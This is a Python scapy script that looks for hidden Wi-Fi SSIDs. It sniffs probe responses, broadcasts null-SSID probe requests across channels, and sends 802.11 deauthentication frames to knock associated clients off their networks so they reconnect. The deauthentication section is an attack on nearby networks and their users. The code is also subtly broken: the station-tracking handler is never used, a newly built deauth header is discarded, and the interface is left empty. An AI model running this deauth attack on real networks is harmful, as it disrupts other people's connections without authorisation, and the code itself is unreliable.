from scapy.all import *

ifname = ''

# Handle STA's ProbeReq and AssoReq packets
assoc = {}  # ap_mac:[sta_mac]
def sta_pckts(pkt):
    # Using Probe and Association requests
    if pkt.haslayer(Dot11ProbeReq) or pkt.haslayer(Dot11AssoReq):
        sta_mac = pkt.addr2  # Get the STA's MAC
        ap_mac = pkt.addr3  # Get the AP's MAc
        if ap_mac not in assoc:
            assoc[ap_mac] = []
        assoc[ap_mac].append(sta_mac)


# Handle AP's ProbResp packets
hiddens = {} # ap_mac:seen (bool)
def ap_proberesp(pkt):
    if pkt.haslayer(Dot11ProbeResp):
        ssid = pkt.info.decode()
        ap_mac = pkt.addr2
        # If the SSID of a hidden network is announced, show it and flag as seen
        if ssid and ap_mac in hiddens and not hiddens[ap_mac]:
            hiddens[ap_mac] = True
            print(f"Found SSID of {ap_mac} : {ssid}")
        # If a new hidden network appears, save the mac
        if not ssid and ap_mac not in hiddens:
            hiddens[ap_mac] = False
            print(f"New hidden AP found ({ap_mac})")




# List hidden networks
# Sniff surrounding APs, keep hidden only
print("Sniff for surrounding AP with hidden SSID")
sniff(iface=ifname, prn=ap_proberesp, timeout=1)



# Reveal with scam
# Send a probe request with a null, seeing if it triggers any AP with hidden SSID
dot11 = Dot11(type=0, subtype=4, addr1="ff:ff:ff:ff:ff:ff", addr2=RandMAC(), addr3=RandMAC())
frame = RadioTap() / dot11 / Dot11ProbeReq() / Dot11Elt(ID="SSID", info="")
print("Try to scam surrounding APs")
for i in range(1, 14):
    print(f"Channel {i}")
    frame[RadioTap].Channel = i
    sendp(frame, iface=ifname, verbose=False)
    print("Wait for answer of APs")
    sniff(iface=ifname, prn=ap_proberesp, timeout=1)

# Reveal with deauth
# Try to deauth a STA connected to one of those networks
print("Try to deauth STA")
for (seen, ap_mac) in enumerate(hiddens):
    if ap_mac not in assoc:
        continue
    # Targets all associated STA
    for sta_mac in assoc[ap_mac]:
        Dot11(addr1=sta_mac, addr2=ap_mac, addr3=ap_mac)
        frame = RadioTap() / dot11 / Dot11Deauth(reason=5)
        sendp(frame, iface=ifname, count=10, inter=0.1)

        # Sniff for reconnection after deauth
        sniff(iface=ifname, prn=ap_proberesp, timeout=1)
